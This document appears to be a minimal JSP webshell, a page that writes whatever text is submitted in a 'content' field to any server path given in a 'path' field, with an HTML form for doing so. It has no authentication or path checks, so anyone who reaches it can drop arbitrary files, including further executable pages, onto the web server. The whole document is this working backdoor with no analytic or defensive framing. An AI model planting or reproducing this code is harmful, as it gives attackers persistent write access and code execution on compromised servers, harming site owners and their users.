<%@ page import="java.util.*,java.io.*,javax.servlet.*"%>
<%
if(request.getParameter("content") != null){
	String content = request.getParameter("content");
	String path = request.getParameter("path");
	FileOutputStream out1 = new FileOutputStream(path);
	out1.write(content.getBytes());
	out1.close();
	out.println("Upload success");
}
%>
<form name=upform method=post action=''>
<textarea name=content rows="50" cols="60"></textarea>
<input name=path type=text >
<input name=submit type=submit >
</form>